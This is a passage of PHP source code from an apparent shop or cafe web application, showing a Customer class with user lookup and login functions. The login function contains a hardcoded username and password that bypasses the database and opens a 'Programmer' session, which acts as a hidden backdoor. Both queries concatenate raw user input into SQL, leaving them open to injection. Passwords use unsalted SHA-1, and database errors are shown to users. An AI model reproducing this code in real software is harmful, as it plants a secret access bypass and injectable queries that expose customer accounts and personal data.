...
class Customer {
	...
	function find_user($id="",$user_name=""){
		global $mydb;
		$mydb->setQuery("SELECT * FROM ".self::$tblname." 
			WHERE CustomerID = {$id} OR Customer_Username = '{$user_name}'");
		$cur = $mydb->executeQuery();
		$row_count = $mydb->num_rows($cur);
		return $row_count;
	}
	function userAuthentication($Customer_Username,$h_Customer_Password){
		global $mydb;

		if ($Customer_Username=='PLAZACAFE' && $h_Customer_Password==sha1('MELOIS')) {
			# code...
			$_SESSION['CustomerID']   		= '1001000110110';
		 	$_SESSION['CustomerName']      	= 'Programmer';

		 	return true;
		}else{
			$mydb->setQuery("SELECT * FROM `tblcustomer` WHERE `Customer_Username` = '". $Customer_Username ."' and `Customer_Password` = '". $h_Customer_Password ."'");
			$cur = $mydb->executeQuery();
			if($cur==false){
				die(mysql_error());
			}
			$row_count = $mydb->num_rows($cur);//get the number of count
			 if ($row_count == 1){
			 	$user_found = $mydb->loadSingleResult();
			 	$_SESSION['CustomerID']   		= $user_found->CustomerID;
			 	$_SESSION['CustomerName']      	= $user_found->CustomerName;
				$_SESSION['CustomerContact'] 	= $user_found->CustomerContact;
				$_SESSION['CustomerAddress'] 	= $user_found->CustomerAddress;
			 	$_SESSION['valid1'] 			= $user_found->valid1;
			 	$_SESSION['valid2'] 			= $user_found->valid2;
			    return true;
			 }else{
			 	return false;
			 }
